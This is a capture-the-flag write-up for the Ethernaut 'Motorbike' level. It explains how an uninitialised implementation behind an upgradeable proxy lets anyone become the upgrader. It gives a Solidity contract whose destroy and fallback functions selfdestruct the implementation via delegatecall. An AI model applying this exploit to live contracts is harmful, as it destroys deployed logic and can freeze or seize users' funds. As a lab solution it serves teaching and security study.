# Level 25: [Motorbike](https://ethernaut.openzeppelin.com/level/0x9b261b23cE149422DE75907C6ac0C30cEc4e652A)

## Level objectives:
`selfdestruct` the implementation contract.
## Analysis
- The current logic contract calls `delegatecall` once–in it's `_upgradeToAndCall` (called by `upgradeToAndCall`) function.
- It is used to change the implementation contract address, hence "upgrading" the contract.
- So we will call `upgradeToAndCall`, point it to our contract and call `selfdestruct` via `delegatecall` => the delegate caller, i.e. the Engine contract, will get `selfdestruct`-ed.
- We just need permissions to call `upgradeToAndCall`. It can be called only by the `upgrader` set in the init function.
- The proxy contract made an error in the constructor. It delegate called the initialize function, so the `upgrader` set in init, was actually set in the proxy's context => the implemantation hasn't even been initialized yet!.
- So I load it into Remix and initialize it => I'm the upgrader.
- So I am already authorized to call `upgradeAndCall`.
## Code:
```sol
pragma solidity ^0.8;

contract DestroyEngine {
    function destroy() public {
        selfdestruct(payable(0x599C5A4be2b87F0128b87Fea208DBE5AE41095e4));
    }

    function genBytes() view public returns (bytes memory) {
        bytes memory b = abi.encodeWithSelector(DestroyEngine(this).destroy.selector);
        return b;
    }

    fallback() external payable {
        selfdestruct(payable(0x599C5A4be2b87F0128b87Fea208DBE5AE41095e4));
    }

}
```

